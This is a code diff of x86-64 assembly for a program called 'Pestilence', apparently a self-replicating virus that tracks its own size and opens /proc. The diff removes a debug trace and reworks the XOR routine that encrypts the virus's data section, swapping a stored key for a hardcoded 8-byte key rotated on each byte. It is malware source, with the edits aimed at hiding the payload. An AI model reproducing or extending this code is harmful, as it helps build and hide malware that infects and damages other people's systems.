@@ -176,7 +176,6 @@ section .text
         sub rbx, rax
         mov dword VAR(Pestilence.virus_size), ebx
 
-        TRACE_TEXT hello, 11
     .open_proc:
         ; open("/proc", O_RDONLY, NULL)
         lea rdi, [proc]
@@ -616,19 +615,22 @@ section .text
         ; Encriptar data
     .encrypt_data    
         lea r10, [rel __F_data]         ; base función
-        lea rbx, [rel xor_pass]   ; key
+        mov rbx, 0x21336C3174733370
+
+        ;lea rbx, [rel xor_pass]   ; key
         xor rcx, rcx              ; contador función
         xor rdx, rdx              ; índice key
 
     .encrypt_data_loop:
         mov r8b, [r10 + rcx]
-        mov r9b, [rbx + rdx]
+        mov r9b, bl
         xor r8b, r9b
         mov [r10 + rcx], r8b
 
+        ror rbx, 8
         inc rcx
-        inc rdx
-        and rdx, 7
+        ; inc rdx
+        ; and rdx, 7
         cmp rcx, (__F_data__end - __F_data)
         jl .encrypt_data_loop       
     
